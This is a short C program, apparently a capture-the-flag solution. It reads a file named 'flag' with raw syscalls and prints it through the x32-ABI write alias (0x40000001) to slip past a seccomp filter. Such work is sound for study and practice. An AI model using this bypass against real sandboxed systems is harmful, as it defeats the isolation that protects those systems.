#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdlib.h>

#ifndef AT_FDCWD
#define AT_FDCWD -100
#endif

//#define X32_SYSCALL_BIT 0x40000000
// 1+0x40000000
//#define X32_write (SYS_write + X32_SYSCALL_BIT)

int main() {
    //  openat 
    int fd = syscall(SYS_openat, AT_FDCWD, "flag", O_RDONLY);
    
    
    
    char buf[1024];
    ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
    if (n < 0) {
        syscall(SYS_close, fd);
        _exit(1);
    }
    buf[n] = '\0';  
    syscall(SYS_close, fd);
    
    
    syscall(0x40000001, STDOUT_FILENO, buf, n);
    
    return 0;
}
